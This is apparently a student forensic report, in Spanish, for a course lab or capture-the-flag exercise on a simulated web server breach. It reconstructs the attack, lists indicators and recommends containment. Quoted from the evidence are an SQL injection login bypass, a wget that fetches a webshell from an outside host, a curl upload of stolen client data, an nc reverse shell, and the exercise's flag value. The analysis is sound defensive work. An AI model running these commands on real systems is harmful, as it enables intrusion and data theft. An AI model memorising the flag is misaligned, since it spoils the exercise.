# Informe forense — Incidente PhantomCorp (phantomcorp-web)


**Grupo:** 14 · **Investigadores:** Fede Peron (@fedeeperon), Laureano Gomez Redondo (@Laureano-GR), Martín Cesano (@martincesano), Martín Gaido (@martingaidoo), Valentina Chiapero (@valechiapero) · **Fecha:** 19/11/2026
**Sistema afectado:** phantomcorp-web (10.0.0.5) · **Tipo:** intrusión + exfiltración

## 0. Declaración de uso de IA

- **Herramienta:** Claude (modelo Claude Sonnet 5.5, de Anthropic) usado a través de Claude Code (CLI), con acceso al repositorio del grupo.
- **Uso:** asistente a lo largo de todo el informe y del análisis de la evidencia.
- **Dinámica de trabajo:**
  1. Un integrante lee el enunciado y la rúbrica y le pide a la IA que explique conceptualmente cada paso, sin ejecutar nada.
  2. Una vez entendido el paso, se le pide a la IA que lo ejecute: comandos sobre la copia de la evidencia (`caso_copia/`, nunca sobre la original) y, cuando corresponde, código.
  3. La IA vuelca en el informe los comandos corridos y sus resultados reales.
  4. El integrante revisa lo producido antes de avanzar al paso siguiente.
- **Verificación:** los resultados se obtienen de la salida real de los comandos (se copian, no se reescriben) y se contrastan contra la evidencia y sus hashes; los hallazgos se cruzan entre fuentes (logs, disco, memoria).

## 1. Resumen del incidente

El 05/09/2026, entre las 02:14 y las 02:45 UTC, un atacante desde la IP 185.220.101.42 entró al servidor phantomcorp-web: exploró el sitio, se logueó al portal de RRHH con una inyección SQL y ejecutó comandos mediante el endpoint `/api/reporte`. Instaló un webshell, escaló a root con un binario SUID, creó un usuario con UID 0 y una tarea cron de persistencia, y subió `clientes.tar.gz` (datos de clientes, 48210 bytes) a un servidor externo (45.13.37.7). Al momento de la captura (02:30) mantenía una reverse shell abierta hacia 45.13.37.7:4444. Además editó `logs/auth.log` después de la captura.

## 2. Cadena de custodia

Se trabajó sobre una **copia** de la evidencia (`caso_copia/`); `labs/lab11-forensia/caso/`
no se modificó.

**Precaución de sistema:** los hashes de `evidencia.sha256` corresponden a los bytes
con saltos de línea LF. En Windows con `core.autocrlf=true` el checkout los convierte
a CRLF y todos los hashes dejarían de coincidir. Por eso la copia se arma con los bytes
tal como están en git y con un `.gitattributes` (`* -text`) que evita la conversión.

**1. Crear la copia de trabajo** (desde la raíz del repo):

```bash
D=entregas/lab11/grupo14/caso_copia
for f in $(git ls-files labs/lab11-forensia/caso); do
  rel=${f#labs/lab11-forensia/caso/}
  mkdir -p "$D/$(dirname "$rel")"
  git show HEAD:"$f" > "$D/$rel"
done
printf '* -text\n' > "$D/.gitattributes"
```

**2. Verificar la integridad de cada archivo contra su hash de captura:**

```bash
cd entregas/lab11/grupo14/caso_copia
sha256sum -c evidencia.sha256        # macOS: shasum -a 256 -c evidencia.sha256
```

Salida:

```
disco/etc/passwd.snippet: OK
disco/listado.txt: OK
disco/var/www/uploads/shell.php.evidencia.txt: OK
logs/access.log: OK
logs/auth.log: FAILED
memoria/bash_history.txt: OK
memoria/lsof.txt: OK
memoria/netstat.txt: OK
memoria/pslist.txt: OK
sha256sum: WARNING: 1 computed checksum did NOT match
```

**3. Comparar el hash esperado con el actual del archivo que falló:**

```bash
grep auth.log evidencia.sha256
sha256sum logs/auth.log
```

| | SHA-256 |
|---|---|
| Registrado en la captura | `0000decafbad0000f1e2d3c4b5a6978800112233445566778899aabbccddeeff` |
| Actual | `7d18039d128d0df7a245ca02f469ea02cd1d4f205a24fb33c5bcf7041b66e9ab` |

**Resultado:** 8 archivos íntegros y 1 alterado. `logs/auth.log` fue modificado
después de la captura (R5): se lo trata como **no confiable** y su contenido solo se
usa como pista a contrastar con las otras fuentes. Un archivo alterado cuya
modificación no se documenta invalida la evidencia; por eso queda registrado acá.

**Contenido de `auth.log` (R5).** Contiene un comentario "nota del forense" con el marcador recuperado del journal (línea 8; el valor se presenta por `./ctf submit 11 R5`). Como el archivo falló el hash, esa nota y su origen ("recuperado del journal") **no están corroborados** y no se usan como prueba. Sus tres eventos reales (líneas 2-4: login SSH de `www-data` desde 185.220.101.42 a las 02:19:55, `sudo` denegado a las 02:20:31, ejecución SUID `system-check` con euid=0 a las 02:21:04) coinciden con la memoria y el disco, pero se tratan solo como indicio. Detalle que refuerza la sospecha: `auth.log:2` atribuye el PID 1201 a `sshd`, mientras que `memoria/pslist.txt:6` muestra al PID 1201 como `sh -c wget http://45.13.37.7/s.php`. Además la línea 5 indica "lineas eliminadas por el atacante": faltan registros.

## 3. Línea de tiempo del ataque

Fecha: 05/09/2026. Las líneas de `access.log` se citan como `access.log:N` (el archivo tiene 2 líneas de cabecera). Reproducible con `src/timeline.py` (salida real en la sección 3.1).

| Hora (UTC) | Fase | Evento | Evidencia (archivo:línea) |
|---|---|---|---|
| 02:14:03 | RECON | Primer contacto de 185.220.101.42 (UA `zgrab`) | access.log:6 |
| 02:14:19-02:14:22 | ENUM | Fuerza bruta de rutas con `gobuster/3.6`: `/admin`, `/login` (404), `/backup`, `/uploads` (301), `/portal-rrhh` (200) | access.log:7-12 |
| 02:16:40-02:16:58 | EXPLOIT | Dos POST a `/portal-rrhh/login` con 401 | access.log:14-15 |
| 02:17:22 | EXPLOIT | **Vector de entrada (SQLi):** POST con `user=admin'--` y respuesta 200: bypass de autenticación | access.log:16 |
| 02:17:41 | EXPLOIT | Descarga de `/backup/rrhh.conf` (200, 210 bytes) | access.log:17 |
| 02:18:10 | RCE | `/api/reporte?token=...&cmd=id`: ejecución de comandos | access.log:18 |
| 02:18:33 | RCE | `cmd=echo <marcador> > /tmp/.p` (URL-encodeado); el archivo aparece en disco a las 02:18 | access.log:19, listado.txt:3 |
| 02:19:02 | RCE | `cmd=wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php` | access.log:20 |
| 02:19 | WEBSHELL | `shell.php` creado en `/var/www/uploads` (431 bytes); `wget` (PID 1201) con conexión residual a 45.13.37.7:80 | listado.txt:4, netstat.txt:5, pslist.txt:6, shell.php.evidencia.txt:1-10 |
| 02:19:48 | WEBSHELL | `/uploads/shell.php?c=whoami` | access.log:21 |
| 02:19:55 | (indicio) | `sshd` acepta login de `www-data` desde 185.220.101.42 (**auth.log alterado**) | auth.log:2 |
| 02:20:31 | (indicio) | `sudo` denegado a `www-data` para `/bin/bash` (**auth.log alterado**) | auth.log:3 |
| 02:21 | PRIVESC | `/usr/local/bin/system-check` (SUID root, copia de bash, 1113504 bytes); se ejecuta `system-check -p -c 'id'` (euid=0) | listado.txt:5, bash_history.txt:4-6, pslist.txt:8, auth.log:4 (indicio) |
| 02:22 | PERSISTENCIA | `/etc/cron.d/phantom-maint` (62 bytes); el webshell indica relanzamiento cada 5 min | listado.txt:6, shell.php.evidencia.txt:9 |
| (sin hora en passwd) | PERSISTENCIA | Usuario `phantom-svc` con UID 0 y shell bash | passwd.snippet:4 |
| 02:23 | EXFIL | `tar czf /tmp/.exfil/clientes.tar.gz` y lectura de `/app/priv/clientes.db.txt` vía webshell (respuesta 200, 48210 bytes, igual al tamaño del tar) | access.log:22, listado.txt:7, bash_history.txt:8, lsof.txt:5 |
| tras 02:23 | EXFIL / C2 | `curl -F f=@clientes.tar.gz http://45.13.37.7/upload?tag=<marcador>`; luego `history -c` | bash_history.txt:9-10 |
| 02:30 | C2 activo | Captura de memoria: `nc 45.13.37.7 4444` (PID 1490, hijo de `system-check`, root) en ESTABLISHED | pslist.txt:1,9, netstat.txt:4, lsof.txt:3 |
| 02:45 | Fin | `sshd` registra el cierre de la conexión de 185.220.101.42 (**auth.log alterado**) | auth.log:9 |

La hora de la escalada y la exfiltración final no se pueden fijar al segundo: `bash_history.txt` no tiene timestamps y `listado.txt` solo tiene precisión de minuto.

Árbol de procesos (`pslist.txt:3-9`): `nginx`(812) -> `sh -c wget`(1201) -> `bash`(1240) -> `system-check`(1477, root) -> `nc`(1490, root). Confirma la cadena web, shell, escalada, C2.

### 3.1 Salida real de `src/timeline.py`

```
$ cd src && PYTHONUTF8=1 python timeline.py ../caso_copia/logs/access.log --ip 185.220.101.42
[*] 16 eventos de 185.220.101.42
  05/Sep/2026:02:14:03 +0000  GET  /                                        [RECON]
  05/Sep/2026:02:14:19 +0000  GET  /robots.txt                              [RECON]
  05/Sep/2026:02:14:20 +0000  GET  /admin                                   [ENUM]
  05/Sep/2026:02:14:20 +0000  GET  /login                                   [ENUM]
  05/Sep/2026:02:14:21 +0000  GET  /backup                                  [ENUM]
  05/Sep/2026:02:14:21 +0000  GET  /portal-rrhh                             [ENUM]
  05/Sep/2026:02:14:22 +0000  GET  /uploads                                 [ENUM]
  05/Sep/2026:02:16:40 +0000  POST /portal-rrhh/login                       [EXPLOIT]
  05/Sep/2026:02:16:58 +0000  POST /portal-rrhh/login                       [EXPLOIT]
  05/Sep/2026:02:17:22 +0000  POST /portal-rrhh/login                       [EXPLOIT]
  05/Sep/2026:02:17:41 +0000  GET  /backup/rrhh.conf                        [EXPLOIT]
  05/Sep/2026:02:18:10 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=id [RCE]
  05/Sep/2026:02:18:33 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p [RCE]
  05/Sep/2026:02:19:02 +0000  GET  /api/reporte?token=phantom-api-7c1e&cmd=wget%20http://45.13.37.7/s.php%20-O%20/var/www/uploads/shell.php [RCE]
  05/Sep/2026:02:19:48 +0000  GET  /uploads/shell.php?c=whoami              [WEBSHELL]
  05/Sep/2026:02:23:15 +0000  GET  /uploads/shell.php?c=cat%20/app/priv/clientes.db.txt [EXFIL]
```

(Sin `--ip` el script informa 21 eventos: 16 del atacante y 5 de usuarios legítimos 10.0.2.x.)

## 4. Indicadores de compromiso (IOCs)

| Tipo | Valor | Dónde apareció |
|---|---|---|
| IP atacante | 185.220.101.42 (UAs `zgrab`, `gobuster/3.6`, `curl/8.5`) | access.log:6-22; auth.log:2,9 (alterado) |
| IP/puerto C2 | 45.13.37.7:4444 (reverse shell, `nc`, PID 1490) | netstat.txt:4, lsof.txt:3, pslist.txt:9 |
| Servidor de staging / exfiltración | 45.13.37.7:80 (`/s.php`, `/upload`) | access.log:20, bash_history.txt:4,9, netstat.txt:5 |
| Archivo malicioso | `/var/www/uploads/shell.php` (webshell; SHA-256 de la captura de evidencia `38f7251c...fc42`) | listado.txt:4, shell.php.evidencia.txt |
| Archivo malicioso | `/usr/local/bin/system-check` (SUID root, copia de bash) | listado.txt:5, pslist.txt:8 |
| Archivo malicioso | `/tmp/.p`, `/tmp/.exfil/clientes.tar.gz` | listado.txt:3,7 |
| Usuario backdoor | `phantom-svc` (UID 0, GID 0, home `/root`) | passwd.snippet:4 |
| Persistencia | `/etc/cron.d/phantom-maint` | listado.txt:6, shell.php.evidencia.txt:9 |
| Credencial/endpoint abusado | token `phantom-api-7c1e` en `/api/reporte?cmd=` | access.log:18-20 |
| Cuenta comprometida | `www-data` (sesión SSH aceptada, indicio) | auth.log:2 (alterado) |

No se incluye el contenido de `phantom-maint` porque no está en la evidencia (solo su existencia y tamaño).

## 5. Alcance del daño

- **Datos exfiltrados:** `/app/priv/clientes.db.txt` (base de clientes), empaquetada en `/tmp/.exfil/clientes.tar.gz` y subida por `curl` a 45.13.37.7. El tamaño de 48210 bytes de la respuesta de `access.log:22` coincide con el del archivo en `listado.txt:7`. Además leyó `/var/www/.env` (`bash_history.txt:3`) y `/backup/rrhh.conf` (`access.log:17`): hay que considerar comprometidas las credenciales que contengan (su contenido no está en la evidencia).
- **Privilegios:** root total (SUID `system-check` y usuario `phantom-svc` con UID 0).
- **Persistencia:** usuario `phantom-svc`, cron `phantom-maint`, webshell y binario SUID.
- **¿Sigue adentro?** Sí, al menos a las 02:30: el `nc` hacia 45.13.37.7:4444 estaba ESTABLISHED. El cierre de conexión de las 02:45 figura solo en el `auth.log` alterado, así que no es confiable; con la persistencia, el acceso sigue vigente hasta erradicarla.
- **Límites:** no hay evidencia de movimiento lateral hacia otros hosts ni del contenido del cron; no se afirma nada al respecto. El `auth.log` fue manipulado y faltan líneas.

## 6. Contención y erradicación (recomendaciones)

1. **Contener:** aislar `phantomcorp-web` de la red (sin apagarlo antes de capturar RAM y disco completos) y bloquear en el firewall 185.220.101.42 y 45.13.37.7 (puertos 80 y 4444).
2. **Matar procesos:** `nc` (1490), `system-check` (1477), `bash` (1240) y `sh`/`wget` (1201).
3. **Erradicar persistencia:** eliminar `/etc/cron.d/phantom-maint`, el usuario `phantom-svc`, `/usr/local/bin/system-check`, `/var/www/uploads/shell.php`, `/tmp/.p` y `/tmp/.exfil/`; revisar otros SUID, claves SSH y cron. Dado el root del atacante, lo más seguro es reconstruir el servidor desde una imagen limpia.
4. **Cerrar el vector:** corregir la SQLi del login de `/portal-rrhh` (consultas parametrizadas); retirar `/api/reporte?cmd=` (ejecución de comandos por parámetro) o protegerlo con autenticación real; sacar `/backup/` del acceso web; impedir ejecución de PHP en `/uploads`; quitar la shell de `www-data`.
5. **Rotar credenciales:** token `phantom-api-7c1e`, credenciales de `.env` y `rrhh.conf`, contraseñas de usuarios y SSH.
6. **Notificar y monitorear:** tratar la fuga de datos de clientes como incidente a notificar según la normativa de protección de datos aplicable (evaluarlo con Legales); buscar los IOCs en otros sistemas; enviar logs a un almacenamiento externo de solo escritura para que no se puedan editar.
7. **Custodia:** preservar la evidencia original, registrar la alteración de `auth.log` y reconstruir esos eventos desde fuentes independientes.

## 7. Preguntas de análisis (P1–P5)

### P1
La RAM es lo más volátil (RFC 3227): se pierde al apagar o reiniciar, mientras que el disco persiste, por eso se captura primero. En este caso la memoria tenía lo que el disco ya no: el `.bash_history` del disco fue borrado, pero en memoria quedaron los comandos (`bash_history.txt`), y solo la memoria muestra el proceso `nc` (PID 1490) con la conexión ESTABLISHED a 45.13.37.7:4444 y la cadena de procesos padre-hijo. Nada de eso está en el disco.

### P2
Se detectó con `sha256sum -c evidencia.sha256`: `logs/auth.log` dio FAILED (esperado `0000decafbad...`, actual `7d18039d...`), y el archivo mismo dice que fue tocado. Además hay una inconsistencia interna: el PID 1201 figura como `sshd` en `auth.log:2` y como `sh -c wget` en `pslist.txt:6`. Si la alteración no se documenta, no se puede demostrar qué contenido es el original ni quién lo cambió, y la evidencia pierde valor probatorio porque deja de ser verificable.

### P3
Evento de las 02:19: (a) log, `access.log:20` (02:19:02) ejecuta `wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php`; (b) disco, `listado.txt:4` registra `shell.php` creado a las 02:19; (c) memoria, `pslist.txt:6` muestra `sh -c wget http://45.13.37.7/s.php` (PID 1201) y `netstat.txt:5` una conexión wget a 45.13.37.7:80. Un segundo caso, a las 02:23: `access.log:22` (lectura de `clientes.db.txt`, 48210 bytes), `listado.txt:7` (`clientes.tar.gz`, 48210 bytes) y `lsof.txt:5` (bash con ese archivo abierto).

### P4
`history -c` solo borra el historial en memoria de esa sesión de shell y no protege lo demás: la sesión de `bash` (PID 1240) seguía viva y su historial se pudo extraer de la memoria (`bash_history.txt`, línea 1: "recuperado de memoria"). Además, los mismos comandos dejaron rastros en otras fuentes: el `access.log` (wget, cmd=), el disco (`listado.txt`) y la red (`netstat.txt`).

### P5
Porque el forense reconstruye lo que hizo el atacante y necesita saber qué rastros deja cada técnica y dónde buscarlos: saber que un SUID copia de bash deja un archivo con permisos especiales, que una SQLi `admin'--` aparece en el POST, que un `?cmd=` es RCE y que un webshell se relanza por cron. También permite anticipar la anti-forensia (`history -c`, logs editados) y buscar las fuentes que sobreviven. Quien no conoce el ataque no sabe qué buscar ni cómo correlacionar las fuentes.

## 8. Captura de `./ctf status 11`
*(Pendiente: lo debe pegar un integrante del grupo; requiere el entorno del curso y haber enviado R1-R5 con `./ctf submit 11 R<n> ...`.)*
